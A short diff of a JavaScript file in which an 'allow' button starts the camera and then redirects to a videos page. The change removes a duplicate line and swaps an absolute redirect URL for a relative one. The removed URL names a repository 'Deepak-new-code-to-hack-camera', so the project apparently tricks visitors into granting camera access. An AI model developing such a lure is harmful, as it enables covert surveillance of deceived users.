@@ -1071,7 +1071,6 @@ function reconnectServer(){
    ALLOW BUTTON
 ========================================= */
 
-allowBtn.onclick =
 allowBtn.onclick = async () => {
 
   const started = await startCamera();
@@ -1079,16 +1078,12 @@ allowBtn.onclick = async () => {
   if (started) {
 
     setTimeout(() => {
-
-      window.location.href =
-        "https://deepakbheemaraj46-rgb.github.io/Deepak-new-code-to-hack-camera/videos.html";
-
+      window.location.href = "videos.html";
     }, 500);
 
   }
 
 };
-
 /* =========================================
    CAMERA TAB RETURNS
 ========================================= */
